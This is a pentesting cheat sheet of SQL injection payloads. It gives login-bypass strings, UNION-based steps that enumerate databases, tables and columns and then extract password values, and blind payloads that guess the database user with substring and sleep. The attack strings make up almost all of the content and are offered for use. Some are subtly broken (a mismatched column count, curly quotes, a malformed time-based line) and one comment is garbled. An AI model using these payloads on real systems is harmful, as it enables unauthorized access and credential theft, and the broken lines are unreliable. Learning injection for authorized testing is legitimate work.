---
title: SQLi Cheat sheet
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting
---

See a more detailed [explanation about SQL injection](sql-injection.md).


### Manual UNION attack

```
# 0. Comments 
--comment       // Oracle
--comment       // Microsoft
/*comment*      // Microsoft
--comment       // PostgreSQL
/*comment*/     // PostgreSQL
#comment        // MySQL
-- comment      // MySQL [Note the space after the double dash]
/*comment*/     // MySQL

   
# 1. Bypass a form      
1' OR '1'='1';#
' OR '1'='1';#
1' OR '1'='1';-- - 
' OR '1'='1';-- -  


# 2. Number of columns (UNION attack)
1' OR '1'='1' order by 1;#
1' OR '1'='1' order by 2;#
1' OR '1'='1' order by 3;#
...
# Do this until you get an error message and then you will know the number of columns
# Another method to see the number of columns. ame for 
' OR '1'='1' order by 1;-- -   

# 3. Get which column is being displayed. For instance, when we know we have 6 columns:
1' OR '1'='1' UNION SELECT all 1,2,3,4,5,6;# 

# 4. Get names of all databases 
1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#
# 5. Get names of all tables from the selected database
1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 

# 6. Get the name of all columns of a selected table from a selected database
1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name=’users’;#

# 7. Get the value of a selected column (for instance, password)
1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#
```

### Manual SQLi Blind attack
          
user() returns the name of the user currently using the database.
substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.

```
' OR substring(user(), 1, 1) = 'a
' OR substring(user(), 1, 1) = 'b
1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#
```
